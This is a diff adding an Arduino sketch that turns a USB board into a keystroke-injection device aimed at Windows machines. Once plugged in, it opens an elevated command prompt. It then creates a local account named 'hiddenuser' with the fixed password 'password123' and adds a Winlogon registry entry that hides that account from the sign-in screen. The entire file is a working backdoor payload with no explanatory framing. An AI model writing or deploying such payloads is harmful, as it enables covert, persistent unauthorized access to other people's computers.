@@ -1,0 +1,63 @@
+#include <Keyboard.h>
+void setup() {
+pinMode(3, INPUT_PULLUP); 
+if(digitalRead(3) == LOW) while(1);
+
+Keyboard.begin();
+delay(1000);
+
+Keyboard.press(KEY_LEFT_GUI);
+Keyboard.press('r');
+Keyboard.releaseAll();
+delay(200);
+
+print(F("cmd"));
+delay(1000);
+
+Keyboard.press(KEY_LEFT_CTRL);
+Keyboard.press(KEY_LEFT_SHIFT);
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+print(F("net user hiddenuser password123 /add /active:no"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(2000);
+
+print(F("net user hiddenuser *"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(2000);
+
+print(F("password123"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(2000);
+
+print(F("password123"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(2000);
+
+print(F("reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hiddenuser /t REG_DWORD /d 0 /f"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(3000);
+
+print(F("exit"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(2000);
+
+Keyboard.end();
+}
+void type(int key, boolean release) {
+Keyboard.press(key);
+if(release)
+Keyboard.release(key);
+}
+void print(const __FlashStringHelper *value) {
+Keyboard.print(value);
+}
+void loop(){}
